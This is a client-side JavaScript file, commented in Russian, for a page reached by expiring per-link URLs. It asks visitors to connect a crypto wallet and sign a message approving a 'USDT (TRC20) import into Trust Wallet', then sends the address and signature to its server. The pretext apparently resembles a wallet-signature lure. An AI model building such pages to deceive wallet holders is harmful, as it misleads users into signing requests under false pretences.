// Основные переменные
let web3;
let accounts = [];
let currentAccount = null;
let socket;
let linkId = null;
let message = null;

// Элементы интерфейса
const screens = {
    loading: document.getElementById('loading-screen'),
    connect: document.getElementById('connect-screen'),
    sign: document.getElementById('sign-screen'),
    success: document.getElementById('success-screen'),
    error: document.getElementById('error-screen'),
    expired: document.getElementById('expired-screen')
};

const connectBtn = document.getElementById('connect-wallet-btn');
const signBtn = document.getElementById('sign-message-btn');
const doneBtn = document.getElementById('done-btn');
const retryBtn = document.getElementById('retry-btn');
const messageBox = document.getElementById('message-box');
const errorMessageEl = document.getElementById('error-message');

// Инициализация
async function init() {
    try {
        // Получаем ID ссылки из URL
        const urlParams = new URLSearchParams(window.location.search);
        const path = window.location.pathname;
        const pathParts = path.split('/');
        
        if (path.includes('/import/')) {
            linkId = pathParts[pathParts.length - 1];
        } else {
            throw new Error('Недействительная ссылка');
        }
        
        // Проверяем валидность ссылки
        const response = await fetch(`/api/link/${linkId}`);
        const data = await response.json();
        
        if (!data.success) {
            if (data.message === 'Срок действия ссылки истек') {
                showScreen('expired');
            } else {
                throw new Error(data.message || 'Ошибка загрузки');
            }
            return;
        }
        
        // Инициализируем соединение с сокетом
        setupSocket();
        
        // Проверяем доступность Web3
        if (window.ethereum) {
            web3 = new Web3(window.ethereum);
            showScreen('connect');
        } else if (window.web3) {
            web3 = new Web3(window.web3.currentProvider);
            showScreen('connect');
        } else {
            throw new Error('Web3 не найден. Установите Trust Wallet или другой совместимый кошелек.');
        }
    } catch (error) {
        console.error('Ошибка инициализации:', error);
        showError(error.message);
    }
}

// Настройка Socket.io
function setupSocket() {
    socket = io();
    
    socket.on('connect', () => {
        console.log('Соединение с сокетом установлено');
        socket.emit('registerSession', { linkId });
    });
    
    socket.on('importReady', (data) => {
        console.log('Токен готов к импорту:', data);
        showScreen('success');
    });
    
    socket.on('error', (data) => {
        console.error('Ошибка сокета:', data);
        showError(data.message || 'Произошла ошибка при обработке запроса');
    });
    
    socket.on('disconnect', () => {
        console.log('Соединение с сокетом закрыто');
    });
}

// Подключение к кошельку
async function connectWallet() {
    try {
        // Запрашиваем доступ к аккаунтам
        accounts = await ethereum.request({ method: 'eth_requestAccounts' });
        currentAccount = accounts[0];
        
        if (!currentAccount) {
            throw new Error('Не удалось получить адрес кошелька');
        }
        
        console.log('Подключен кошелек:', currentAccount);
        
        // Генерируем сообщение для подписи
        message = `Я подтверждаю запрос на импорт токена USDT (TRC20) в Trust Wallet.\n\nАдрес: ${currentAccount}\nВремя: ${new Date().toISOString()}\nID: ${linkId}`;
        
        messageBox.textContent = message;
        showScreen('sign');
    } catch (error) {
        console.error('Ошибка подключения кошелька:', error);
        showError(error.message);
    }
}

// Подписание сообщения
async function signMessage() {
    try {
        if (!currentAccount || !message) {
            throw new Error('Кошелек не подключен или сообщение не сгенерировано');
        }
        
        // Запрашиваем подпись
        const signature = await ethereum.request({
            method: 'personal_sign',
            params: [message, currentAccount]
        });
        
        console.log('Сообщение подписано:', signature);
        
        // Отправляем подпись на сервер
        socket.emit('signMessage', {
            address: currentAccount,
            message: message,
            signature: signature
        });
        
        // Показываем экран загрузки пока ждем ответа от сервера
        showScreen('loading');
    } catch (error) {
        console.error('Ошибка подписания сообщения:', error);
        showError(error.message);
    }
}

// Обработка нажатия кнопки "Готово"
function handleDone() {
    window.close();
}

// Показать определенный экран
function showScreen(screenName) {
    Object.values(screens).forEach(screen => {
        screen.classList.add('hidden');
    });
    
    screens[screenName].classList.remove('hidden');
}

// Показать ошибку
function showError(message) {
    errorMessageEl.textContent = message || 'Произошла неизвестная ошибка';
    showScreen('error');
}

// Обработчики событий
connectBtn.addEventListener('click', connectWallet);
signBtn.addEventListener('click', signMessage);
doneBtn.addEventListener('click', handleDone);
retryBtn.addEventListener('click', () => {
    showScreen('connect');
});

// Отслеживание изменения аккаунта
if (window.ethereum) {
    ethereum.on('accountsChanged', (newAccounts) => {
        accounts = newAccounts;
        currentAccount = accounts[0];
        
        if (currentAccount) {
            message = `Я подтверждаю запрос на импорт токена USDT (TRC20) в Trust Wallet.\n\nАдрес: ${currentAccount}\nВремя: ${new Date().toISOString()}\nID: ${linkId}`;
            messageBox.textContent = message;
        } else {
            showScreen('connect');
        }
    });
}

// Запуск приложения
document.addEventListener('DOMContentLoaded', init); 